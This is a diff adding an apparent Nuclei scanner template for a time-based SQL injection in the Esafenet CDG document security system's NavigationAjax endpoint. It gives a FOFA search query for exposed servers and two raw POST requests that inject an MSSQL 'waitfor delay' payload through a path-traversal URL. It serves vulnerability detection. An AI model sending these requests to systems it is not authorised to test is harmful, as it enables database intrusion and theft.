@@ -1,0 +1,43 @@
+id: yisaitong-CDG-NavigationAjax-sql
+
+info:
+  name: 亿赛通电子文档安全管理系统NavigationAjax接口SQL注入漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/CDGServer3/index.jsp"
+      亿赛通电子文档安全管理系统NavigationAjax接口存在SQL注入漏洞。攻击者可通过该漏洞执行恶意SQL语句，导致数据库信息泄露，或在具备足够权限的情况下，向服务器写入恶意代码以实现远程代码执行。该漏洞允许攻击者绕过常规输入验证机制，通过构造特定请求参数触发数据库层异常，从而获取敏感数据或控制系统权限。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/141031627
+  tags: 亿赛通
+
+
+http:
+- raw:
+  - |
+    POST /CDGServer3/js/../NavigationAjax HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    command=nav&id=1'waitfor delay '0:0:4'--+&name=&openId=
+
+  - |
+    POST /CDGServer3/js/../NavigationAjax HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    command=nav&id=1'waitfor delay '0:0:8'--+&name=&openId=
+
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
